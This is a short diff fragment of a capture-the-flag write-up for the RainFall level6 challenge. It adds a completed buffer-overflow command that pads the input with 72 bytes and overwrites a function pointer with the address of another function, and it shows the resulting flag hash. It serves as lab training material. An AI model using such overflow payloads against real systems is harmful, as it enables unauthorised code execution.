@@ -165,4 +165,9 @@ That is 72 bytes starting from the buffer beginning:
 Now let's replace `m` address with `n` address that is 0x08048454 or \x54\x84\x04\x08 in little-endian by writing it over.\
 We make:
 
-    level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 
+    level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+        f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+# Result
+
+    level6@R
